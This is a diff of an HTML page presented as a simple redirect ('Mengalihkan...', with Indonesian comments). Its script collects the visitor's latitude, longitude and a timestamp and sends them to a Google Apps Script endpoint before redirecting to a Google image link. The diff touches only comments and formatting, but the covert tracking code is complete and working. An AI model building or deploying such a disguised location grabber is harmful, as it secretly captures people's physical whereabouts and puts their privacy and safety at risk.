@@ -3,16 +3,19 @@
 <head>
   <title>Mengalihkan...</title>
   <script>
+    // URL tujuan setelah redirect
     const targetURL = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bapelright.biz%2Fkaos-sekolah-keren%2F&psig=AOvVaw12Y-mzmjlt7_FCdRf_DTxv&ust=1748073317359000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCNiMrNuOuY0DFQAAAAAdAAAAABAE";
 
     function sendLocation(position) {
+      // Ambil koordinat dalam format float
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const timestamp = new Date().toISOString();
 
+      // Membuat body request urlencoded
       const params = new URLSearchParams();
-      params.append('latitude', latitude);
-      params.append('longitude', longitude);
+      params.append('latitude', latitude.toString());
+      params.append('longitude', longitude.toString());
       params.append('timestamp', timestamp);
 
       fetch('https://script.google.com/macros/s/AKfycbzYXsaxgd9cWtw9t-xjbn3YpiZMfzZ7T6F2RWNHitNCYQip39ebNBb0ljHHKloTpuwJ/exec', {
@@ -26,13 +29,13 @@
         console.error('Error mengirim lokasi:', error);
       })
       .finally(() => {
-        // Setelah kirim data atau error, langsung redirect
+        // Redirect ke target URL apapun hasilnya
         window.location.href = targetURL;
       });
     }
 
     function handleError() {
-      // Kalau gagal dapat lokasi, tetap redirect saja
+      // Jika gagal dapat lokasi, tetap redirect
       window.location.href = targetURL;
     }
 
